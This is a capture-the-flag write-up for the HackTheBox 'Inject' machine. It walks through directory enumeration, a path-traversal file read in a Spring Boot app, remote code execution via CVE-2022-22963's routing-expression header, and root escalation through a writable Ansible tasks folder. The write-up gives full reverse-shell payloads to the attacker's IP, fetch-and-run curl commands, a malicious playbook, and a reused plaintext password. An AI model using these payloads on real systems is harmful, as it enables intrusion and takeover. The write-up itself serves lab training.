# Inject

## System

IP Address: **10.10.11.204**

Hostname: **inject.htb**

OS: **Linux**

## Discovery

The system exposes SSH and port `8080`, which is reported as `nagios`:

```bash
$ sudo nmap -p- -sV inject.htb 

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  nagios-nsca Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Curling port 8080 reveals it’s a web page. The headers aren’t very telling, nor is any of the page source. The site branding looks like `Zodd Cloud`. It appears to offer cloud storage for files.

> Store, share, and collaborate on files and folders from your mobile device, tablet, or computer.

> Drive can provide encrypted and secure access to your files. Files shared with you can be proactively scanned and removed when malware, spam, ransomware, or phishing is detected.
 
> An encryption system with an highly Encrypted algorithm which enables that you are the only one who can able to decrypt the cloud service. Which provides full control of your cloud service

> Faster uploading and downloading of larger files irrespective of your internet speed. A Compression algorithm works underhood which enables loss less compression.

There’s a link to [https://www.youtube.com/embed/qtOIh93Hvuw](https://www.youtube.com/embed/qtOIh93Hvuw) , a TED talk on how the internet works. Trolling or is there something useful there?

The site appears to offer file storage with encryption and possibly compression at rest. Something helpful to know going forward.

Browsing the page shows a login button that doesn’t appear to work and a `/register` page that is “under construction”. There’s a link to `/blogs` which has a couple of articles and comments. The articles will not open, but we see that there are two authors: `admin` and `Brandon Auger`. There’s also an upload button that takes us to a separate `/upload` page. This seems like the most promising path towards the user flag.

Let’s discover any sub-directories / paths available:

```html
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    --url http://inject.htb:8080
/show_image           (Status: 400) [Size: 194]
/upload               (Status: 200) [Size: 1857]
/register             (Status: 200) [Size: 5654]
/blogs                (Status: 200) [Size: 5371]
/environment          (Status: 500) [Size: 712]
/error                (Status: 500) [Size: 106]
/release_notes        (Status: 200) [Size: 1086]
```

Interesting. Through my own browsing, when an HTTP 400 or 500 is thrown, it looks like the default Tomcat error page, which means Java. Changing the `Accept` header to only `application/json` gives us some more insight: 

```html
HTTP/1.1 500 
Content-Type: application/json
Date: Sun, 12 Mar 2023 23:26:39 GMT
Connection: close
Content-Length: 712

{"timestamp":"2023-03-12T23:26:39.032+00:00","status":500,"error":"Internal Server Error","message":"Discovered 3 methods that would qualify as 'functional' - [protected java.lang.String org.springframework.boot.ApplicationServletEnvironment.doGetActiveProfilesProperty(), protected java.lang.String org.springframework.boot.ApplicationServletEnvironment.doGetDefaultProfilesProperty(), protected org.springframework.core.env.ConfigurablePropertyResolver org.springframework.boot.ApplicationServletEnvironment.createPropertyResolver(org.springframework.core.env.MutablePropertySources)].\n Class 'class org.springframework.boot.ApplicationServletEnvironment' is not a FunctionalInterface.","path":"/environment"}
```

So this is definitely a Spring Boot box. Good to know. I probed the `/environment` and `/env` endpoints for a bit, but nothing came of it.

The `/release_notes` page contains a summary of changes, but ultimately nothing useful:

```html
    <h2><a name="v1.1"> Version v1.2 - November 13, 2022</a></h2>
    <ul>
        <li><span class="badge badge-fixed">fixed</span> some minor bugs</li>
    </ul>

    <h2><a name="v1.1"> Version v1.1 - September 10, 2022</a></h2>
    <ul>
        <li><span class="badge badge-fixed">fixed</span>optimized user experience</li>
        <li><span class="badge badge-added">added</span> some checks on the upload feature</li>
        <li><span class="badge badge-fixed">fixed</span> some minor bugs</li>
    </ul>
```

## User

A sample upload generates a POST request to `/upload` and outputs a link to our uploaded file:

```bash
POST /upload HTTP/1.1
Host: inject.htb:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvINcYnCZjyDDpoEV

------WebKitFormBoundaryvINcYnCZjyDDpoEV
Content-Disposition: form-data; name="file"; filename="foo.png"
Content-Type: image/png
```

```bash
http://inject.htb:8080/show_image?img=foo.png
```

Can it accept any type of file, or just images? Can we mess with the multipart form-data and adjust *where* the file is stored? Can we manipulate the `img` parameter to include a different file or perform some sort of injection?

After uploading various file types, the form only accepts image files. That seems like a dead end. However, it does appear that we can perform a LFI from the `/show_image` endpoint:

```html
GET /show_image?img=/etc/passwd HTTP/1.1
Host: inject.htb:8080
Accept: application/json

HTTP/1.1 500 
Content-Type: application/json
Date: Sun, 12 Mar 2023 23:32:04 GMT
Connection: close
Content-Length: 248

{"timestamp":"2023-03-12T23:32:04.767+00:00","status":500,"error":"Internal Server Error","message":"URL [file:/var/www/WebApp/src/main/uploads/etc/passwd] cannot be resolved in the file system for checking its content length","path":"/show_image"}
```

Nice! I now know the app root path and the upload directory. I can use a relative path to try and download  well-known files for spring boot apps:

```html
GET /show_image?img=../resources/application.properties HTTP/1.1
Host: inject.htb:8080
Accept: application/json

HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 327
Date: Sun, 12 Mar 2023 23:34:33 GMT
Connection: close

server.tomcat.relaxed-query-chars=|,{,},[,]
server.error.whitelabel.enabled=false
spring.main.allow-circular-references=true
spring.servlet.multipart.max-file-size=1MB
spring.servlet.multipart.max-request-size=2MB
spring.cloud.config.uri=
spring.cloud.config.allow-override=true
debug=false
server.error.include-message=always
```

LFI confirmed! I’m going to see what else I can get:

```html
GET /show_image?img=../../../pom.xml HTTP/1.1
Host: inject.htb:8080
Accept: application/json

HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 2187
Date: Sun, 12 Mar 2023 23:35:31 GMT
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
  ...
```

It took me a while here. I know the Spring Boot version and all the POMs. After some searching, I was able to find `cve-2022-22963` and this article explaining how to exploit it for remote execution: [https://sysdig.com/blog/cve-2022-22963-spring-cloud/](https://sysdig.com/blog/cve-2022-22963-spring-cloud/)

This seems like our ticket. After some trial and error with commands, I was able to use the following and gain a remote shell:

```html
# Local Setup
$ cat <<EOF >shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.109/1337 0>&1
EOF
$ python -m http.server 8000
$ nc -lvnp 1337

# Requests
# Store the shell
$ curl -X POST -d 'POST' \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl -o /tmp/shell http://10.10.14.109:8000/shell.sh')" \
  http://inject.htb:8080/functionRouter
# Execute it
$ curl -X POST -d 'POST' \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('/bin/sh /tmp/shell')" \
  http://inject.htb:8080/functionRouter
```

Now I have access as `frank`:

```html
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.109] from (UNKNOWN) [10.10.11.204] 39990
frank@inject:/$
```

There doesn’t appear to be a user flag in `frank`’s home dir. But I did find the `.m2` maven directory. Inside the `.m2/settings.xml` we find a username and password for `phil`:

```html
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

I login as `phil` and retrieve the user flag:

```html
frank@inject:~$ su - phil
Password: 
phil@inject:~$ cat user.txt
d5595286de1e15da7d13f5ef5accda4a
```

## System

There’s an `.ansible` directory in `phil`'s home. I found a simple ansible playbook:

```html
phil@inject:~$ find / -name '*.y*ml' 2> /dev/null | grep -v '/usr/lib/python3'
/opt/automation/tasks/playbook_1.yml
phil@inject:~$ cat /opt/automation/tasks/playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
```

I can run this as the `phil` user, but maybe there’s a way to escalate using ansible. One interesting detail is the `/opt/automation` directory is only world readable, while the `tasks` sub-directory is writeable. This seems like a clue.

A search for vulnerabilities didn’t turn up much. I ran `pspy` and found a `cron` task that was running and executing anything inside the `tasks` folder with a `.yml` extension:

```html
023/03/13 02:32:01 CMD: UID=0 PID=10396 | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

There was also a `cron` job that was erasing everything in the `tasks` directory and copying `playbook_1.yml` from the root directory after. I crafted a simple playbook to initiate a reverse shell (which should happen as root):

```html
- hosts: localhost
  tasks:
  - name: foo
    ansible.builtin.command: bash -c 'bash -i >& /dev/tcp/10.10.14.109/443 0>&1'
```

Then I ran a loop to copy this playbook into the `tasks` folder continuously, in case the windows between removing YAML files and executing them with ansible was too small:

```html
while true; do cp /tmp/.pb.yml /opt/automation/tasks/pb.yml; done
```

On my attacking system, I started a listener and sure enough, a root shell appeared 🙂

```html
root@inject:~$
```

## Conclusion

The hardest part about this box was fingerprinting the web server and finding a foothold. I spent too much time testing the LFI avenue. Going from LFI to the `/functionRouter` exploit was a lot of trial and error. Took a lot of turns, but it was a fun box.

